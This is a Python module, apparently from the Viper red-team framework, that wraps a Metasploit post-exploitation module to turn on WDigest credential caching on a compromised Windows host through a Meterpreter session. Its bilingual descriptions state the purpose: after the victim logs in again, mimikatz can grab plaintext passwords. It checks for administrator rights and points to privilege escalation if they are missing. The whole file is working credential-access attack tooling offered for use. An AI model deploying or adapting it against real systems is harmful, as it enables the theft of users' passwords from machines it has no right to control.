# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :


from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME_ZH = "Windows WDigest开关"
    DESC_ZH = "用于打开WDigest凭证存储开关.\n" \
              "Windows 8/2012以上版本默认关闭Wdigest开关.\n" \
              "通过修改注册表UseLogonCredential值打开开关.\n" \
              "当用户注销重新登录后即可使用mimikatz抓取密码."

    NAME_EN = "Windows WDigest switch"
    DESC_EN = "Used to turn on the WDigest credential storage switch.\n" \
              "Windows 8/2012 or later versions turn off the Wdigest switch by default.\n" \
              "Turn on the switch by modifying the registry UseLogonCredential value.\n" \
              "When the user logout and login again, mimikatz can be used to grab the password."

    REQUIRE_SESSION = True
    MODULETYPE = TAG2TYPE.Credential_Access
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["Administrator", "SYSTEM", ]  # 所需权限
    ATTCK = ["T1003"]  # ATTCK向量
    REFERENCES = ["https://attack.mitre.org/techniques/T1003/"]
    README = ["https://www.yuque.com/vipersec/module/tad836"]
    AUTHOR = ["Viper"]

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "post"
        self.mname = "windows/manage/wdigest_caching_api"

    def check(self):
        """执行前的检查函数"""
        self.session = Session(self._sessionid)

        if self.session.is_windows is not True:
            return False, "此模块只支持Windows的Meterpreter", "This module only supports Meterpreter for Windows"
        if self.session.is_admin is not True:
            return False, "此模块需要管理员权限,请尝试提权", "This module requires administrator privileges, please try privilege escalation"
        return True, None

    def callback(self, status, message, data):
        if status:
            self.log_info("模块执行完成", "Module operation completed")
            self.log_good(f"返回消息: {message}", f"Return message: {message}")
        else:
            self.log_error("模块执行失败", "Module execution failed")
            self.log_error(message, message)
